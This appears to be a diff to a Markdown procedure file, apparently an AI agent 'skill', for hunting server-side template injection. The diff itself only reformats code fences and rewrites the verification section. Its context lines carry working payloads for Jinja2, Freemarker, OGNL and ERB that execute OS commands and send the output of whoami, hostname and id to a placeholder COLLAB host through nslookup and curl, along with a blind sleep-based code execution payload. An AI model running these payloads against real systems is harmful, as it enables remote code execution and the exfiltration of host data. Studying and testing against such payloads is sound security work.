@@ -25,7 +25,7 @@ Use when the target has any endpoint that renders user-controlled input through 
 
 ## How to Run
 
-```bash
+```text
 # Jinja2 — exfil via DNS
 {{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}
 
@@ -48,7 +48,7 @@ The phases below are the procedure. Keep each probe bounded (`--max-time`), reco
 
 ## Quick Reference
 
-```bash
+```text
 # Detection polyglot — try this in EVERY user-controlled field
 {{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
 # Expectation: 49 appears in the response (or 7777777 for Jinja2 string repetition)
@@ -149,7 +149,7 @@ ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
 
 When SSTI output isn't reflected but the template still evaluates (email templates, PDF generation), use OOB detection:
 
-```bash
+```text
 # Jinja2 — exfil via DNS
 {{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}
 
@@ -168,7 +168,7 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).inv
 
 ### Phase 4 — Chaining
 
-```bash
+```text
 # SSTI → RCE → internal network scan
 {{lipsum.__globals__.os.popen('curl http://COLLAB/$(hostname)').read()}}
 
@@ -297,35 +297,18 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilde
 <%= system("curl http://COLLAB/$(id)") %>
 ```
 
-## Verification
-
-Run this self-test to confirm ssti hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-ssti" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **SSTI without code execution** — `{{7*7}}` returning 49 proves template injection. Need to escalate to code execution (RCE) or file read for impact.
 - **Sandboxed template engines** — Jinja2 sandbox, Twig sandbox, etc. require specific bypass techniques. Don't assume unsandboxed execution.
 - **Template engine misidentification** — Jinja2 vs Twig vs Freemarker have different syntax. `{{7*7}}` works on multiple engines. Fingerprint first.
 - **Blind SSTI** — if output is not reflected, use time-based or OOB techniques. `{% import os %}{{os.popen('sleep 10').read()}}` for blind RCE.
+
+---
+
+## Verification
+- In-band confirmation requires arithmetic evaluation (`{{7*7}}` renders `49`), not mere reflection.
+- Blind confirmation requires an OOB callback from the template runtime.
+- The engine fingerprint and exact payload/response are recorded beneath `${OUTPUT_DIR:-./output}`.
 
 ---
 
